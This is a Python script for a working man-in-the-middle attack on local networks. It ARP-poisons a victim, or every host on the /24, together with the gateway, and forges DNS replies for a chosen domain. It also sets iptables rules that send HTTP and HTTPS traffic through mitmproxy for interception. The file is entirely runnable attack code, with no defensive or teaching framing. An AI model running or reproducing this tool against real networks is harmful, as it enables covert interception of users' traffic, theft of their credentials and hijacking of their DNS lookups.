#!/usr/bin/env python
#
# Execute with sudo python arppoison.py
#
#
import time
import argparse
import signal
import nfqueue
import threading
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

exit = False

threads = []

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
    parser.add_argument("-g", "--gateway", help="Choose the router IP address. Example: -r 192.168.0.1")
    parser.add_argument("-i", "--interface", help="Choose the network interface. Example: -i eth0")
    parser.add_argument("-d", "--dns", help="dns spoofing. Example: -d hackaday.com")
    parser.add_argument("-w", "--web", action='store_true', help="80 web proxy")
    parser.add_argument("-s", "--ssl", action='store_true', help="443 web proxy")
    parser.add_argument("-p", "--proxy", action='store_true', help="start proxy")
    parser.add_argument("-c", "--clean", action='store_true', help="clean all stuff")
    
    return parser.parse_args()

def get_gw(interface):
    for nw, nm, gw, iface, addr in read_routes():
        if iface == interface and gw != "0.0.0.0":
            return gw


def spoof(localMac,victims,gateway):
    arps = []
    op = 2
    for victim in victims:
        #spoof victim
        arp = ARP(op=op,psrc=victim,pdst=gateway,hwdst=localMac)
        arps.append(arp)
        #spoof gw
        arp = ARP(op=op,psrc=gateway,pdst=victim,hwdst=localMac)
        arps.append(arp)
    def run():
        j = 0
        while not exit:
            for arp in arps:
                j+=1
                if exit:
                    break
                send(arp,verbose=False)
            time.sleep(1)
    t1 = threading.Thread(target=run)
    threads.append(t1)
    #t1.join()

queues = []

def clean():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('0\n')

    print "[x] clean iptable"
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('iptables -F')
    os.system('iptables -X')

def signal_handler(signal, frame):
    exit = True
    clean()
    for queue in queues:
        queue.unbind(socket.AF_INET)
        queue.close()
    sys.exit("losing...")

def dns_setup(dns, localIp):
    def dns_callback(i, payload):
        data = payload.get_data()
        pkt = IP(data)
        if not pkt.haslayer(DNSQR):
            payload.set_verdict(nfqueue.NF_ACCEPT)
        else:
            if dns[0] in pkt[DNS].qd.qname:
                print "%s %s => %s"%(hex(pkt[DNS].id), pkt[IP].src, pkt[IP].dst)
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                            an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIp))
                payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
                print '[+] Sent spoofed packet for %s' % dns
    os.system('iptables -A FORWARD -p udp --dport 53 -j NFQUEUE  --queue-num 100')
    queue = nfqueue.queue()
    queue.open()
    queue.bind(socket.AF_INET)
    queue.set_callback(dns_callback)
    queue.create_queue(100)
    def run():
        queue.try_run()
        print "Dns spoof stopped"
    p = Process(target=run)
    threads.append(p)

def main(args):
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")


    clean()
    if args.clean:
        return
    interface = "eth0"
    if args.interface is not None:
        interface = args.interface
        
    localMac = get_if_hwaddr(interface)
    localIp = get_if_addr(interface)
    
    if args.gateway is not None:
        gateway = args.gateway
    else:
        gateway = get_gw(interface)
    
    
    victims = []
    if args.victimIP is None:
        for i in range(0,255):
            base = localIp.split(".")[:3]
            base.append(str(i))
            ip = '.'.join(base)
            victims.append(ip)
    else:
        victims.append(args.victimIP)
        
    if gateway is None:
        print "Gateway issue"
        return
    
    signal.signal(signal.SIGUSR1, signal_handler)
    
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')
        
    if args.dns is not None:
        dns_setup(args.dns, localIp)
        
    need_proxy = False
    if args.web:
        need_proxy = True
        os.system('iptables -t nat -A PREROUTING -i %s -p tcp --dport 80 -j REDIRECT --to-port 8080'%interface)
    
    if args.ssl:
        need_proxy = True
        os.system('iptables -t nat -A PREROUTING -i %s -p tcp --dport 443 -j REDIRECT --to-port 8080'%interface)
        
    if args.proxy:
        if need_proxy:
            def run():
                os.system("mitmproxy -T --host --anticache --stream 10m")
                print "proxy stopped"
            p = Process(target=run)
            threads.append(p)
        else:
            print "Proxy started but not needed"
    else:
        if need_proxy:
            print "you will need to start your proxy manually"
    spoof(localMac, victims, gateway)
    try:
        for t in threads:
            t.start()
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print "stop"
    clean()

main(parse_args())